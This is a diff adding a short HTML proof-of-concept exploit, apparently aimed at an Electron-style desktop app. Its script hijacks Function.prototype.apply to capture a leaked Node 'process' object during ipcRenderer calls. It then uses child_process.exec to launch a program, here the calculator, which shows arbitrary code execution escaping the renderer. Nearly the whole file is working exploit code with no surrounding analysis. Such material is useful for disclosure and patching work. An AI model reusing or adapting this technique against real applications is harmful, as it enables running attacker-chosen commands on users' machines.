@@ -1,0 +1,31 @@
+<!DOCTYPE HTML>
+<html>
+  <h1>poc</h1>
+  <script>
+    var process1;
+
+Function.prototype._apply = Function.prototype.apply;
+
+
+function poc2() {
+Function.prototype.apply = Function.prototype._apply;
+process1.getBuiltinModule('child_process').exec('calc')
+
+};
+
+Function.prototype.apply = function(...r) {
+    for (var i = 0; i < r.length ; i++ in r) {
+        console.log(r[i]);
+        if (r[i].constructor.name == 'process') { //leak process
+            process1 = r[i];
+            poc2();
+            break;
+        }
+    }
+}
+
+for(let i=0; i<11; i++) {
+workd.ipcRenderer.on('x',function(){});
+}
+  </script>
+</html>
